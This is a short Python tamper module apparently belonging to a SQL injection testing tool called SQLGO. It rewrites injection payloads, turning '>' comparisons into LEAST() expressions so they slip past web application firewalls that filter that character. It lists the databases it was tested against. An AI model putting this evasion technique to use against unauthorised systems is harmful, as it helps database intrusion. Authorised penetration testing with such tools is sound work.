#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 AliMirmohammad

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

import re



def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'LEAST' counterpart

    Tested against:
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The LEAST clause is a widespread SQL command. Hence, this
          tamper script should work against majority of databases

    >>> tamper('1 AND A > B')
    '1 AND LEAST(A,B+1)=B+1'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)

        if match:
            _ = "%sLEAST(%s,%s+1)=%s+1" % (match.group(1), match.group(3), match.group(4), match.group(4))
            retVal = retVal.replace(match.group(0), _)

    return retVal